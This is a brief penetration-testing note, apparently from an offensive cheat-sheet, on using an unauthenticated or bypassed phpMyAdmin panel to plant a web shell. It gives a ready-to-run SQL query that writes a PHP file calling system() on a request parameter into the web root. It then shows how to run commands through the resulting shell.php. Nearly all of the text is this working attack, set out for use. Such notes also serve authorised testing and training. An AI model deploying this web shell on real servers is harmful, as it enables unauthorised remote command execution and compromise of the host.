# phpMyAdmin

If you find a phpMyAdmin part of a site that does not have any authentication, or you have managed to bypass the authetication you can use it to upload a shell.

You go to:
```
http://192.168.1.101/phpmyadmin/
```

Then click on SQL. 

```
Run SQL query/queries on server "localhost":
```
From here we can just run a sql-query that creates a php script that works as a shell

So we add the following query:
```
SELECT "<?php system($_GET['cmd']); ?>" into outfile "C:\\xampp\\htdocs\\shell.php"
```
The query is pretty self-explanatory. Now you just visit `192.168.1.101/shell.php?cmd=ipconfig` and you have a working web-shell.